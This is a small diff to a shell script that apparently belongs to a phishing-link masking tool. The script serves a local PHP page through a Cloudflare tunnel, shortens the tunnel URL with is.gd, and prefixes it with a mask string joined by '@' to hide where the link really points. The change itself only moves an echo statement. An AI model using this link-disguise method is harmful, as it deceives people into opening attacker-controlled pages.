@@ -43,6 +43,8 @@ ini_cloud(){
     fi
     sleep 10
     fkurl=$(grep -o "https://[a-zA-Z0-9]*\.trycloudflared.com" ".cld.log")
+    echo "$fkurl"
+
 }
 
 make_php(){
@@ -113,7 +115,6 @@ make_php "$msk"
 php -S "$host":"$port" > /dev/null 2>&1 &
 ini_cloud
 cd "$loc"
-echo "$fkurl"
 req=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${fkurl})
 is_gd=${req#https://}
 new_url=$msk@$is_gd
